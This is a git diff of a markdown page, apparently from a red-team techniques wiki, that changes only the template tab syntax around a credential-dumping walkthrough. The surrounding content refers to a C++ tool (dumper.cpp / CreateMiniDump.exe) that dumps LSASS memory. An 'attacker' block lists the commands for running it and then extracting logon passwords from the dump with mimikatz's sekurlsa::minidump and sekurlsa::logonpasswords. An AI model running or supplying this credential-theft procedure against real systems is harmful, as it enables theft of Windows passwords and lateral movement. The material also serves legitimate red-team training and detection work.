@@ -14,8 +14,8 @@ The below code uses a number of known Windows API calls that could still be flag
 
 Let's go ahead and compile this C++ code:
 
-{% code-tabs %}
-{% code-tabs-item title="dumper.cpp" %}
+{% tabs %}
+{% tab title="dumper.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include <windows.h>
@@ -52,8 +52,8 @@ int main() {
     return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% file src="../../.gitbook/assets/createminidump.exe" caption="CreateMiniDump.exe" %}
 
@@ -69,16 +69,16 @@ Do not forget to add `dbghelp.lib` as a dependency in the Linker &gt; Input sett
 4. Open mimikatz and load in the dump file 
 5. Dump passwords
 
-{% code-tabs %}
-{% code-tabs-item title="attacker" %}
+{% tabs %}
+{% tab title="attacker" %}
 ```csharp
 .\createminidump.exe
 .\mimikatz.exe
 sekurlsa::minidump c:\temp\lsass.dmp
 sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/peek-2019-03-23-22-16.gif)
 
